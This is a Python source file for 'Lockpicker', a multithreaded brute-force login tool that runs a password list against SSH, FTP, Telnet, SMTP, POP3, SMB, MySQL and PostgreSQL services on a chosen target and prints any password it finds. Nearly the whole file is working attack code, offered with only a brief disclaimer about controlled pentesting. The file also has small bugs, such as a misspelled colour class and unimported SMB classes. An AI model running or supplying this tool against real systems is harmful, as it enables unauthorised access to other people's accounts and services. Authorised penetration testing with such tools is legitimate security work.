#!/usr/bin/python3

import sys
import os
import uuid
import argparse
from tqdm import tqdm
import threading
import socket
from spnego.exceptions import SpnegoError
from concurrent.futures import ThreadPoolExecutor, as_completed
import telnetlib
import paramiko
import ftplib
import smbprotocol
import poplib
import smtplib
import mysql.connector
import psycopg2

class bcolors:
	BLUE = '\033[94m'
	GREEN = '\033[92m'
	LIGHT_BLUE = '\x1b[38;5;51m'
	YELLOW = '\033[33m'
	FAIL = '\033[91m'
	ENDC = '\033[0m'
	WARNING = '\033[1;31m'

found = threading.Event()

def check_connectivity(IP, numport):

	try:
		s = socket.socket()
		s.connect((IP, numport))

	except ConnectionRefusedError:
		print(bcolors.FAIL+"[!] ERROR | Connection refused - service is offline or blocking connections. Exiting...\n"+bcolors.ENDC)
		s.close()
		sys.exit(1)

	finally:
		s.close()

def ssh(IP, username, word, numport):

	ssh = None
	if found.is_set():
		return None

	try:
		ssh = paramiko.SSHClient()
		ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		if found.is_set():
			return None
		ssh.connect(
			IP,
			port=numport,
			username=username,
			password=word,
			allow_agent=False,
			look_for_keys=False,
			timeout=15,
			banner_timeout=15,
			auth_timeout=15,
		)

		tqdm.write(bcolors.GREEN+ f"\n[+] SUCCESS | The SSH password is: {bcolors.YELLOW}{word}"+bcolors.ENDC)
		found.set()
		return word

	except paramiko.AuthenticationException:
		return None

	except paramiko.ssh_exception.SSHException as e:
		print(bcolors.FAIL + f"[!] SSH ERROR | {e}, try to lower the number of threads."+bcolors.ENDC)
		exit(1)

	except (Exception, BaseException) as e:
		print(bcolors.FAIL + f"[!] SSH ERROR | {e}"+bcolors.ENDC)

	finally:
		if ssh is not None:
			ssh.close()

def ftp(IP, username, word, numport):

	ftp = None
	if found.is_set():
                return None

	try:
		ftp = ftplib.FTP(timeout=5)
		ftp.connect(IP, port=numport)
		if found.is_set():
			return None
		ftp.login(username, word)
		tqdm.write(bcolors.GREEN + f"\n[+] SUCCESS | The FTP password is: {bcolors.LIGHT_BLUE}{word}"+bcolors.ENDC)

		found.set()
		return word

	except ftplib.error_perm:
		return None

	except (ftplib.error_reply, ftplib.error_temp, ftplib.error_proto, Exception) as e:
		print(bcolors.FAIL + f"[!] FTP ERROR | {e}"+bcolors.ENDC)

	finally:
		if ftp is not None:
			ftp.close()

def telnet(IP, username, word, numport):

	telnet = None
	if found.is_set():
		return None

	try:
		telnet = telnetlib.Telnet()
		telnet.open(IP, port=numport, timeout=2)

		telnet.read_until(b"login: ")
		telnet.write(username.encode("ascii")+b"\n")
		telnet.read_until(b"Password: ")
		telnet.write(word.encode("ascii")+b"\n")

		output = telnet.read_until(b"login:", timeout=3)
		if b"incorrect" in output.lower():
			return None

		tqdm.write(bcolors.GREEN + f"\n[+] SUCCESS | The Telnet password is: {bcolor.YELLOW}{word}"+bcolors.ENDC)

		found.set()
		return word

		telnet.close()

	except Exception as e:
		print(bcolors.FAIL + f"[!] Telnet ERROR | {e}"+bcolors.ENDC)

	finally:
		if telnet is not None:
			telnet.close()

def smtp(IP, username, word, numport):

	smtp = None
	if found.is_set():
		return None
	try:
		smtp = smtplib.SMTP(IP, numport)

		smtp.login(username, word, initial_response_ok=True)
		tqdm.write(bcolors.GREEN + f"\n[+] SUCCESS | The SMTP password is: {bcolors.YELLOW}{word}"+bcolors.ENDC)

		found.set()
		return word

		smtp.quit()

	except (smtplib.SMTPAuthenticationError, smtplib.SMTPServerDisconnected):
		return None
	except Exception as e:
		print(bcolors.FAIL + f"[!] SMTP ERROR | {e}"+bcolors.ENDC)

	finally:
		if smtp is not None:
			smtp.quit()

def pop3(IP, username, word, numport):

	pop = None
	if found.is_set():
		return None
	try:
		pop = poplib.POP3(IP, numport)

		pop.user(username)
		pop.pass_(word)
		tqdm.write(bcolors.GREEN + f"\n[+] SUCCESS | The POP3 password is: {bcolors.YELLOW}{word}"+bcolors.ENDC)

		found.set()
		return word

		pop.quit()

	except poplib.error_proto:
		return None

	except Exception as e:
		print(bcolors.FAIL + f"[!] POP3 ERROR | {e}"+bcolors.ENDC)

	finally:
		if pop is not None:
			pop.quit()

def smb(IP, username, word, numport):

	if found.is_set():
		return None

	try:
		guid = uuid.uuid4()
		conn = Connection(guid, IP)
		conn.connect()

		if found.is_set():
			return None

		session = Session(conn, username=username, password=word)
		session.connect()
		tqdm.write(bcolors.GREEN + f"\n[+] SUCCESS | The SMB password is: {bcolors.YELLOW}{word}"+bcolors.ENDC)

		found.set()
		return word

	except (smbprotocol.exceptions.LogonFailure, smbprotocol.exceptions.SMBAuthenticationError, SpnegoError):
		return None

	except Exception as e:
		print(bcolors.FAIL + f"[!] SMB ERROR | {e}"+bcolors.ENDC)

def mysql_auth(IP, username, word, numport):

	if found.is_set():
		return None

	try:
		mysql.connector.connect(
			host=IP,
			port=numport,
			user=username,
			password=word
		)

		tqdm.write(bcolors.GREEN + f"[+] SUCCESS | The MySQL password is: {bcolors.YELLOW}{word}"+bcolors.ENDC)

		found.set()
		return word

		mysql.close()

	except mysql.connector.errors.ProgrammingError:
		return None

	except Exception as e:
		print(bcolors.FAIL + f"[!] MySQL ERROR | {e}"+bcolors.ENDC)

def postgresql(IP, username, word, numport):

	postgres = None

	if found.is_set():
		return None

	try:
		postgres = psycopg2.connect(
			dbname=database,
			user=username,
			password=word,
			host=IP,
			port=numport
		)

		tqdm.write(bcolors.GREEN + f"[+] SUCCESS | The PostgreSQL password is: {bcolors.YELLOW}{word}"+bcolors.ENDC)

		found.set()
		return word

		postgres.close()

	except psycopg2.OperationalError as e:
		return None

	except Exception as e:
		print(bcolors.FAIL + f"[!] PostgreSQL ERROR | {e}"+bcolors.ENDC)

	finally:
		if postgres is not None:
			postgres.close()

def main():

	examples=f'''{bcolors.BLUE}examples:{bcolors.ENDC}
	 python3 lockpicker.py user@127.0.0.1 -p passwords.txt -s telnet
	 python3 lockpicker.py postgres@127.0.0.1 -p passwords.txt -s postgresql -n 5555 -t 12'''

	parser = argparse.ArgumentParser(
		description=f'''\
{bcolors.BLUE}description:{bcolors.ENDC}
Lockpicker is a multithreaded brute force login tool, 
supporting various protocols to attack (new modules are easy to add).\n
This tool is dedicated to security researchers and pentesters to perform
brute force attacks in controlled and safe environemnts.
{bcolors.WARNING}Any illegal use of this tool could be met with consequences.{bcolors.ENDC}\n
Currently supported modules:	telnet, ssh, ftp, smb, smtp, pop3, mysql, postgresql''',
		epilog=examples,
		formatter_class=argparse.RawDescriptionHelpFormatter)
	parser.add_argument("server", metavar="USERNAME@IP", help="target to attack")
	parser.add_argument("-p", "--passwordlist", help="passwordlist to iterate through", required=True)
	parser.add_argument("-n", "--numport", help="custom port number for selected service")
	parser.add_argument("-t", "--threads", help="threads used to attack (default=8)", default=8, type=int)
	parser.add_argument("-s", "--service", help="target service to attack", required=True)
	args = parser.parse_args()

	server = args.server
	passwordlist = args.passwordlist
	numport = args.numport
	threads = int(args.threads)

	if threads <= 0:
		print(bcolors.FAIL + "[!] ERROR | Threads cannot be equal to or less than 0!"+bcolors.ENDC)
		sys.exit(1)
	service = args.service
	global database

	servername = server.split("@")
	username = servername[0]
	IP = servername[1]

	print(bcolors.BLUE + f"\n[*] Starting lockpicker on {IP}, user lockpicked: {bcolors.LIGHT_BLUE}{username}"+bcolors.ENDC)

	passlist = []

	try:
		with open(passwordlist, 'r') as file:
			for word in file:
				word = word.strip('\r\n')
				passlist.append(word)
	except Exception as exc:
		print(bcolors.FAIL + "[!] ERROR | Password list not found!"+bcolors.ENDC)
		sys.exit(1)

	match service:
		case "ssh":
			proto = ssh
			if numport is None:
				numport = 22
			print(bcolors.BLUE + f"[*] Attacking SSH on port {numport}..."+bcolors.ENDC)
		case "ftp":
			proto = ftp
			if numport is None:
				numport = 21
			print(bcolors.BLUE + f"[*] Attacking FTP on port {numport}..."+bcolors.ENDC)
		case "telnet":
			proto = telnet
			if numport is None:
				numport = 23
			print(bcolors.BLUE + f"[*] Attacking Telnet on port {numport}..."+bcolors.ENDC)
		case "smtp":
			proto = smtp
			if numport is None:
				numport = 25
			print(bcolors.BLUE + f"[*] Attacking SMTP on port {numport}..."+bcolors.ENDC)
		case "pop3":
			proto = pop3
			if numport is None:
				numport = 110
			print(bcolors.BLUE + f"[*] Attacking POP3 on port {numport}..."+bcolors.ENDC)
		case "smb":
                        proto = smb
                        if numport is None:
                                numport = 445
                        print(bcolors.BLUE + f"[*] Attacking SMB on port {numport}..."+bcolors.ENDC)
		case "mysql":
			proto = mysql_auth
			if numport is None:
				numport = 3306
			print(bcolors.BLUE + f"[*] Attacking MySQL on port {numport}..."+bcolors.ENDC)
		case "postgresql":
			proto = postgresql
			if numport is None:
				numport = 5432
			database = input("[*] Enter database name: ")
			print(bcolors.BLUE + f"[*] Attacking PostgreSQL on port {numport}..."+bcolors.ENDC)
		case _:
			print(bcolors.FAIL+"[!] ERROR | Unknown protocol! Supported protocols: telnet, ssh, ftp, smb, pop3, smtp, mysql, postgresql."+bcolors.ENDC)
			sys.exit(1)

	check_connectivity(IP, numport)

	with ThreadPoolExecutor(max_workers=threads) as executor:
		futures = [executor.submit(proto, IP, username, word, numport) for word in passlist]
		for future in tqdm(as_completed(futures), total=len(futures)):
			global result
			result = future.result()

			if result:
				executor.shutdown(wait=False, cancel_futures=True)
				break

if __name__ == "__main__":
	print(r"      _               _          _      _")
	print(r"     | |    ___   ___| | ___ __ (_) ___| | _____ _ __       _ __  _   _")
	print(r"     | |   / _ \ / __| |/ / '_ \| |/ __| |/ / _ \ '__|     | '_ \| | | |")
	print(r"     | |__| (_) | (__|   <| |_) | | (__|   <  __/ |     _  | |_) | |_| |")
	print(r"     |_____\___/ \___|_|\_\ .__/|_|\___|_|\_\___|_|    (_) | .__/ \__, |")
	print(r"                          |_|                              |_|    |___/")

	main()
	if result is None:
		print(bcolors.YELLOW+"[*] Password not found."+bcolors.ENDC)
	print("\n")

